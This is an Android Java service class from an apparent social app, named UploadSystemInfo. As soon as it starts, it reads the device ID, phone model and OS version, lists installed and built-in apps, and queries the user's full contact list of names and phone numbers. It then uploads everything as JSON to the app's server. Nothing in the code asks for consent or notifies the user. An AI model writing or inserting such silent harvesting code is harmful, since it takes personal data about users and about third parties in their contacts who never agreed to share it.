package com.touyuanren.hahahuyu.service;


import android.app.Service;
import android.content.AsyncQueryHandler;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;
import android.provider.ContactsContract;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.squareup.okhttp.Request;
import com.touyuanren.hahahuyu.Application.MyApplication;
import com.touyuanren.hahahuyu.bean.ContactBean2;
import com.touyuanren.hahahuyu.bean.PackageMod;
import com.touyuanren.hahahuyu.http.HttpApi;
import com.touyuanren.hahahuyu.utils.FoHttp;
import com.touyuanren.hahahuyu.utils.FoSystemInfo;
import com.zhy.http.okhttp.callback.StringCallback;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

/**
 * Created by Jing on 2016/6/1.
 * 上传用户的手机型号，应用列表，及通讯录
 */
public class UploadSystemInfo extends Service {
    private Handler hander = new Handler() {
        @Override
        public void handleMessage(Message msg) {
            super.handleMessage(msg);
            //进行上传
            initUserInfo();
            upLoadUserInfo();
        }
    };
    private String userInfo;
    /**
     * 通讯录集合
     */
    private List<ContactBean2> list_contact = new ArrayList<ContactBean2>();
    private MyAsyncQueryHandler asyncQueryHandler; // 异步查询数据库类对象

    private Map<Integer, ContactBean2> contactIdMap = null;

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        asyncQueryHandler = new MyAsyncQueryHandler(this.getContentResolver());
        init();
    }

    public void initUserInfo() {
        TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        String DEVICE_ID = tm.getDeviceId();
        try {
            JSONObject jsonObject = new JSONObject();
            jsonObject.put("device_id", DEVICE_ID);
            jsonObject.put("phone_model", android.os.Build.MODEL);
            jsonObject.put("phone_version_sdk", android.os.Build.VERSION.SDK);
            jsonObject.put("phone_version_release", android.os.Build.VERSION.RELEASE);
            List<PackageMod> installApps = FoSystemInfo.initData(MyApplication.getContext(), FoSystemInfo.getInstallApps(MyApplication.getContext()));
            JSONArray jsonArray = new JSONArray();
            for (int i = 0; i < installApps.size(); i++) {
                JSONObject jsonObject2 = new JSONObject();
                jsonObject2.put("package_name", installApps.get(i).getPackageName());
                jsonObject2.put("appName", installApps.get(i).getAppName());
                jsonArray.put(i, jsonObject2);
            }
            jsonObject.put("install_apps", jsonArray);
            List<PackageMod> builtInApps = FoSystemInfo.initData(MyApplication.getContext(), FoSystemInfo.getBuiltInApps(MyApplication.getContext()));
            JSONArray jsonArray2 = new JSONArray();
            for (int i = 0; i < builtInApps.size(); i++) {
                JSONObject jsonObject1 = new JSONObject();
                jsonObject1.put("package_name", builtInApps.get(i).getPackageName());
                jsonObject1.put("appName", builtInApps.get(i).getAppName());
                jsonArray2.put(i, jsonObject1);
            }
            jsonObject.put("built_in_apps", jsonArray2);
            JSONArray jsonArray1 = new JSONArray();
            for (int i = 0; i < list_contact.size(); i++) {
                JSONObject jsonObject3 = new JSONObject();
                jsonObject3.put("desplayName", list_contact.get(i).getDesplayName());
                jsonObject3.put("phoneNum", list_contact.get(i).getPhoneNum());
                jsonArray1.put(i, jsonObject3);
            }
            jsonObject.put("contact_msg", jsonArray1);
            userInfo = jsonObject.toString();
        } catch (JSONException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return super.onStartCommand(intent, flags, startId);
    }

    public void upLoadUserInfo() {
        //执行请求；完成后销毁
        Map<String, String> formMap = new HashMap<>();
        formMap.put("keyword", userInfo);
        FoHttp.getMsg(HttpApi.ROOT_PATH + HttpApi.UPLOAD_USER_SYSTEM_INFO, formMap, new StringCallback() {
            @Override
            public void onError(Request request, Exception e) {

            }

            @Override
            public void onResponse(String response) {
            }
        });

    }

    private void init() {
        Uri uri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI; // 联系人Uri；
        // 查询的字段
        String[] projection = {ContactsContract.CommonDataKinds.Phone._ID,
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                ContactsContract.CommonDataKinds.Phone.DATA1, "sort_key",
                ContactsContract.CommonDataKinds.Phone.CONTACT_ID,
                ContactsContract.CommonDataKinds.Phone.PHOTO_ID,
                ContactsContract.CommonDataKinds.Phone.LOOKUP_KEY};
        // 按照sort_key升序查詢
        asyncQueryHandler.startQuery(0, null, uri, projection, null, null,
                "sort_key COLLATE LOCALIZED asc");

    }

    private class MyAsyncQueryHandler extends AsyncQueryHandler {

        public MyAsyncQueryHandler(ContentResolver cr) {
            super(cr);
        }

        @Override
        protected void onQueryComplete(int token, Object cookie, Cursor cursor) {

            if (cursor != null && cursor.getCount() > 0) {
//                list_contact = new ArrayList<ContactBean2>();
                contactIdMap = new HashMap<Integer, ContactBean2>();
                cursor.moveToFirst(); // 游标移动到第一项
                for (int i = 0; i < cursor.getCount(); i++) {
                    cursor.moveToPosition(i);
                    String name = cursor.getString(1);
                    String number = cursor.getString(2);
                    String sortKey = cursor.getString(3);
                    int contactId = cursor.getInt(4);
                    Long photoId = cursor.getLong(5);
                    String lookUpKey = cursor.getString(6);

                    if (contactIdMap.containsKey(contactId)) {
                        // 无操作
                    } else {
                        // 创建联系人对象
                        ContactBean2 contact = new ContactBean2();
                        contact.setDesplayName(name);
                        contact.setPhoneNum(number);
                        contact.setSortKey(sortKey);
                        contact.setPhotoId(photoId);
                        contact.setLookUpKey(lookUpKey);
                        list_contact.add(contact);
                        contactIdMap.put(contactId, contact);
                    }
                }
                hander.sendEmptyMessage(1000);
            }
        }
    }

    public static void logE(String tag, String content) {
        int p = 2048;
        long length = content.length();
        if (length < p || length == p)
            Log.e(tag, content);
        else {
            while (content.length() > p) {
                String logContent = content.substring(0, p);
                content = content.replace(logContent, "");
                Log.e(tag, logContent);
            }
            Log.e(tag, content);
        }
    }
}
